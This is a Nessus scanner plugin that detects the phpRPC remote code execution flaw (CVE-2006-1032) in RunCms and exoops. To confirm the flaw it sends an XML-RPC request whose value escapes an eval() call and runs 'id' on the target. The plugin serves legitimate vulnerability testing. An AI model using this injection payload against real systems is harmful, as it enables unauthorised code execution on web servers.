#
# (C) Tenable Network Security
#


  desc = "
Synopsis : 

The remote web server contains a PHP library that is prone to
arbitrary code execution. 

Description :

The remote host has installed on it the phpRPC library, an xmlrpc
library written in PHP and bundled with applications such as RunCms
and exoops. 

The version of phpRPC on the remote host fails to sanitize user input
to the 'server.php' script before using it in an 'eval()' function,
which may allow for remote code to be executed on the affected host
subject to the privileges of the web server userid. 

Note that successful exploitation may require that the phpRPC library
be enabled in, say, RunCms, which is not necessarily the default. 

See also :

http://www.gulftech.org/?node=research&article_id=00105-02262006
http://www.securityfocus.com/archive/1/426193/30/0/threaded

Solution :

Disable or remove the affected library.

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description) {
  script_id(20986);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-1032");
  script_bugtraq_id(16833);

  script_name(english:"phpRPC Library Remote Code Execution Vulnerability");
  script_summary(english:"Checks for remote code execution in phpRPC library");
 
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl", "no404.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (get_kb_item("www/no404/"+port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/runcms", "/exoops", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Check whether the script exists.
  #
  # nb: both RunCms and exoops use this.
  url = string(dir, "/modules/phpRPC/server.php");
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (res == NULL) exit(0);

  # If it does...
  #
  # nb: the script only responds to POSTs.
  if (egrep(string:res, pattern:"^HTTP/.* 200 OK")) {
    # Try to exploit the flaw to run a command.
    cmd = "id";
    postdata = string(
      '<?xml version="1.0"?>\n',
      "<methodCall>\n",
      "<methodName>test.method</methodName>\n",
      "  <params>\n",
      "    <param>\n",
      "      <value><base64>'));system(", cmd, ");exit;\n",
      "    </param>\n",
      "  </params>\n",
      "</methodCall>"
    );
    req = string(
      "POST ", url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: text/xml\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we see the code in the XML debug output.
    if (egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res)) {
     report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Nessus was able execute the command '", cmd, "' on the remote host;\n",
        "it produced the following output :\n",
        "\n",
        res
      );

      security_warning(port:port, data:report);
      exit(0);
    }
  }
}
